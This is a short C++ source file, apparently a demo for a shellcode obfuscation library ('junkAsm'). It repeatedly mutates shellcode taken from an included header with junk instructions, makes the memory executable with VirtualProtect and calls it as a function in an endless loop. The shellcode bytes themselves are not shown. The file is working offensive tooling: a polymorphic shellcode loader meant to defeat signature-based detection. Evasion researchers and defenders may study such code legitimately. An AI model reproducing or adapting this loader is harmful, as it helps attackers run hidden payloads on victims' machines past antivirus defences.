#include "stdio.h"
#include "windows.h"
#include "tchar.h"
#include "junkAsm.h"
#include <ctime>
#include <cassert>
#include <string>
#include "shellcode-demo.h"

int main() {
	printf("Origion Shellcode Length=%d\r\n", sizeof(shellcode));
	set_junk_level(junk_level_debug);
	int count = 0;
	while (true) {
		std::string sc((char*)shellcode, sizeof(shellcode));
		// 这里设置循环混淆4次，可以任意修改
		for (int i = 0; i < 4; i++) {
			unsigned char *dst = 0;
			int dstLen;
			bool ret = junkAsm((unsigned char*)sc.c_str(), sc.length(), &dst, &dstLen);
			assert(ret);
			sc = std::string((char*)dst, dstLen);
			free(dst);
		}

		DWORD dwOldProtect = 0;
		VirtualProtect((LPVOID)sc.c_str(),
			(SIZE_T)sc.length(),
			PAGE_EXECUTE_READWRITE,
			&dwOldProtect);

		// Execute it
		typedef void(*FUNC)();
		FUNC func = (FUNC)(sc.c_str());
		func();

		printf("Run Times:%d After Obfuscate ShellcodeLength=%d\r\n", count++, sc.length());
	}

	return 0;
}
